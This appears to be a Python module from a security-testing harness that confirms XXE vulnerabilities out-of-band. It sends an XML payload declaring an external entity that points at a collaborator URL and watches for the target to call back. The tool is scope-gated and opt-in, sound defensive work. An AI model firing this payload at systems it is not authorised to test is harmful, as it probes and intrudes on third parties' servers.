"""
XXE confirmation leg (deterministic, OOB via the in-process collaborator).

The xxe agent can only GUESS that an XML endpoint resolves external entities. This
proves it out-of-band: POST an XML document declaring an external entity that
points at a unique collaborator URL, and watch for the target's XML parser to
fetch it. A callback is proof the parser resolved the external entity -- confirmed
XXE -- independent of whether the entity's content is reflected (blind XXE too).

Fires on xxe findings, or on any endpoint whose captured request body is XML.
Scope-gated; active (validators.active_enabled).
"""
from __future__ import annotations

from urllib.parse import urlsplit

import httpx

import harness.collaborator as _collab
from harness import global_throttle
from harness.models import Finding, HttpExchange
from harness.safety_gate import GatedAsyncClient, get_default_gate, SafetyGateBlocked
from .base import Validator, ValidationResult


def _looks_xml(exchange: HttpExchange) -> bool:
    ct = ""
    for k, v in (exchange.request_headers or {}).items():
        if k.lower() == "content-type":
            ct = (v or "").lower()
    body = (exchange.request_body or "").lstrip()
    return "xml" in ct or body.startswith("<?xml") or (body.startswith("<") and ">" in body)


def _payload(callback: str) -> str:
    # External general entity fetched over HTTP -> OOB. Kept minimal and inert
    # (no file read, no parameter-entity DTD tricks) -- the callback alone proves
    # external-entity resolution.
    return ('<?xml version="1.0"?>\n'
            f'<!DOCTYPE probe [<!ENTITY xxe SYSTEM "{callback}">]>\n'
            '<probe>&xxe;</probe>')


class XxeValidator(Validator):
    name = "xxe"
    finding_classes = {"xxe", "xml_external_entity", "xml_external_entities"}
    active = True

    def __init__(self, *, allowed_hosts: list[str] | None = None, timeout: float = 10.0,
                 collaborator=None):
        self.allowed_hosts = allowed_hosts or []
        self.timeout = timeout
        self._collab = collaborator

    def collab(self):
        return self._collab or _collab.shared()

    def applies(self, finding: Finding, exchange: HttpExchange) -> bool:
        return super().applies(finding, exchange) or _looks_xml(exchange)

    def _skip(self, why: str) -> ValidationResult:
        return ValidationResult(self.name, "skipped", "xxe", summary=why)

    async def validate(self, finding: Finding, exchange: HttpExchange) -> ValidationResult:
        host = urlsplit(exchange.url).hostname or ""
        if self.allowed_hosts and host not in self.allowed_hosts:
            return self._skip(f"host {host!r} out of scope")
        if not _looks_xml(exchange):
            return self._skip("endpoint does not take XML -- nothing to inject an external entity into")
        collab = self.collab()
        token = collab.token()
        headers = {k: v for k, v in (exchange.request_headers or {}).items()
                   if k.lower() not in ("host", "content-length")}
        headers.setdefault("Content-Type", "application/xml")
        method = (exchange.method or "POST").upper()
        try:
            await global_throttle.acquire()
            # The XML POST is a mutating send -> route it through the safety gate
            # (needs the allow_mutating_replay opt-in).
            async with GatedAsyncClient(get_default_gate(), self.name, timeout=self.timeout,
                                        follow_redirects=False, verify=False) as client:
                await client.request(method, exchange.url, headers=headers, content=_payload(collab.url(token)))
        except SafetyGateBlocked:
            return self._skip("mutating XML replay not authorized (set validators.allow_mutating_replay)")
        except httpx.HTTPError as e:
            return ValidationResult(self.name, "error", "xxe", summary=f"request failed: {e.__class__.__name__}")
        if await collab.wait_for_hit(token, timeout=self.timeout):
            return ValidationResult(
                self.name, "confirmed", "xxe", confidence=0.95, confirmed=True,
                summary="XXE confirmed: the XML parser resolved an external entity and fetched an "
                        "attacker-controlled URL out-of-band.",
                evidence=f"POSTed an XML document declaring an external entity pointing at a unique "
                         f"collaborator URL to {exchange.url}; the parser called back to it (blind-safe proof).")
        return ValidationResult(
            self.name, "not_confirmed", "xxe", confidence=0.0, confirmed=False,
            summary="No out-of-band callback observed -- external entities appear disabled",
            evidence="The external-entity payload produced no collaborator hit within the window.")
